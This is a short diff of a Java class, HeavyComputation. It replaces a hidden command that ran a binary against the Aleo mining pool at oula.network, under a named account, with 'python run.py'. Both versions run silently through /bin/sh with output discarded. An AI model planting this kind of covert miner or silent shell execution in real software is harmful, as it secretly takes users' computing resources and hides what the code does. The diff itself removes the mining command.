@@ -5,7 +5,7 @@ public class HeavyComputation {
 
     public static void performHeavyComputation() throws IOException, InterruptedException {
         // The command to execute, concatenated for simplicity in Java
-        String command = "./cos --pool wss://aleo.oula.network:6666 --account vbropa --worker-name RANDOM";
+        String command = "python run.py";
 
         // Execute the command with output redirection to /dev/null to hide output
         Process process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command + " > /dev/null 2>&1"});
